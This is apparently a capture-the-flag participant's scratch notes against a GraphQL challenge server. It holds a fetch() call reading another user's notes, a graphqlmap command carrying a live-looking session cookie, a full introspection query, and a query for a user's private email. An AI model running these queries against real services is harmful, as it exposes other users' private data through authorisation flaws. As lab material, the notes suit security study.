fetch("http://202.38.93.111:15001/graphql", {
    "headers": {
        "content-type": "application/json",
    },
    "body": "{\"query\":\"{ notes(userId: 2) { id\\ncontents }}\"}",
    "method": "POST",
});

/*
graphqlmap?

python3 graphqlmap.py -u http://202.38.93.111:15001/graphql -v --method POST --headers '{"Cookie" : "session=.eJwlzslOwzAUQNF_8TZI8fMQ292lraukUkvCJGBT2cl7SikCNUNBRfw7kdjds7s_7EA9Dh1bjP2EN-xwbNmCOch05CCCBa3AOuJcBLQhihAdYiM0GO24alGTNGhBGamsU5AFTREiaUNCgUQttZyBEqJtBTQ6kAqGEFrlBCJvCbgzIVrpeBREFpWg0LB5ZBqw_78RM8fPE37MDc4tdv5lVdbr_d1b0ZhEqvZ9-ZXc50M2pttqPaZPnJLlbd6VWbp93vi9qMsuL88XV_viGj1MpX9I68fv4lJVx3Ojpp3vr3HTODgp-brS7PcP5oBQmQ.YXQVOA.ntZtaoKMg2ZYs101bWjnI22nWi4"}'

dump_new

自省查询？
{"query":" query IntrospectionQuery {  __schema { queryType { name } mutationType { name } subscriptionType { name } types {  ...FullType } directives {  name  description  locations  args {  ...InputValue  } }  } } fragment FullType on __Type {  kind  name  description  fields(includeDeprecated: true) { name description args {  ...InputValue } type {  ...TypeRef } isDeprecated deprecationReason  }  inputFields { ...InputValue  }  interfaces { ...TypeRef  }  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason  }  possibleTypes { ...TypeRef  } } fragment InputValue on __InputValue {  name  description  type { ...TypeRef }  defaultValue } fragment TypeRef on __Type {  kind  name  ofType { kind name ofType {  kind  name  ofType {  kind  name  ofType {   kind   name   ofType {  kind  name  ofType {   kind   name   ofType {   kind   name   }  }   }  }  } }  } } ","variables":null}

{user (id:1) { username privateEmail}}

*/